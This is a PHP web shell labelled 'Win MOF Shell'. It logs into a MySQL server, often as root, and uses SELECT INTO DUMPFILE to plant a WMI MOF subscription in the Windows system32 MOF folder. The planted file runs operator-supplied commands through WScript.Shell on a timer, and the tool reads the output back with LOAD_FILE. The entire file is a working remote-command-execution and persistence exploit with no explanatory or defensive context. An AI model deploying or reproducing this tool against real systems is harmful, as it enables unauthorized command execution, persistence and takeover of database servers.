<?php
$path="c:/windows/system32/canimei";
session_start();
if(!empty($_POST['submit'])){
setcookie("connect");
setcookie("connect[host]",$_POST['host']);
setcookie("connect[user]",$_POST['user']);
setcookie("connect[pass]",$_POST['pass']);
setcookie("connect[dbname]",$_POST['dbname']);
echo "<script>location.href='?action=connect'</script>";
}
if(empty($_GET["action"])){
?>

<html>
<head><title>Win MOF Shell</title></head>
<body>
<form action="?action=connect" method="post">
Host:
<input type="text" name="host" value="192.168.200.144:3306"><br/>
User:
<input type="text" name="user" value="root"><br/>
Pass:
<input type="password" name="pass" value="toor"><br/>
DB:
<input type="text" name="dbname" value="mysql"><br/>
<input type="submit" name="submit" value="Submit"><br/>
</form>
</body>
</html>

<?php
exit;
}
if ($_GET[action]=='connect')
{
$conn=mysql_connect($_COOKIE["connect"]["host"],$_COOKIE["connect"]["user"],$_COOKIE["connect"]["pass"])  or die('<pre>'.mysql_error().'</pre>');
 echo "<form action='' method='post'>";
echo "Cmd:";
echo "<input type='text' name='cmd' value='$strCmd'?>";
echo "<br>";
echo "<br>";
echo "<input type='submit' value='Exploit'>";
echo "</form>";
echo "<form action='' method='post'>";
echo "<input type='hidden' name='flag' value='flag'>";
echo "<input type='submit'value=' Read  '>";
echo "</form>";
if (isset($_POST['cmd'])){
$strCmd=$_POST['cmd'];
$cmdshell='cmd /c '.$strCmd.'>'.$path;
$mofname="c:/windows/system32/wbem/mof/system.mof";
$payload = "#pragma namespace(\"\\\\\\\\\\\\\\\\.\\\\\\\\root\\\\\\\\subscription\")

instance of __EventFilter as \$EventFilter
{
  EventNamespace = \"Root\\\\\\\\Cimv2\";
  Name  = \"filtP2\";
  Query = \"Select * From __InstanceModificationEvent \"
      \"Where TargetInstance Isa \\\\\"Win32_LocalTime\\\\\" \"
      \"And TargetInstance.Second = 5\";
  QueryLanguage = \"WQL\";
};

instance of ActiveScriptEventConsumer as \$Consumer
{
  Name = \"consPCSV2\";
  ScriptingEngine = \"JScript\";
  ScriptText =
  \"var WSH = new ActiveXObject(\\\\\"WScript.Shell\\\\\")\\\\nWSH.run(\\\\\"$cmdshell\\\\\")\";
 };

instance of __FilterToConsumerBinding
{
  Consumer = \$Consumer;
  Filter = \$EventFilter;
};";
mysql_select_db($_COOKIE["connect"]["dbname"],$conn);
$sql1="select '$payload' into dumpfile '$mofname';";
if(mysql_query($sql1))
  echo "<hr>Execute Successful!<br> Please click the read button to check the  result!!<br>If the result is not correct,try read again later<br><hr>"; else die(mysql_error());
 mysql_close($conn);
}

if(isset($_POST['flag']))
{
  $conn=mysql_connect($_COOKIE["connect"]["host"],$_COOKIE["connect"]["user"],$_COOKIE["connect"]["pass"])  or die('<pre>'.mysql_error().'</pre>');
   $sql2="select load_file(\"".$path."\");";
  $result2=mysql_query($sql2);
  $num=mysql_num_rows($result2);
  while ($row = mysql_fetch_array($result2, MYSQL_NUM)) {
    echo "<hr/>";
    echo '<pre>'. $row[0].'</pre>';
  }
  mysql_close($conn);
}
}
?>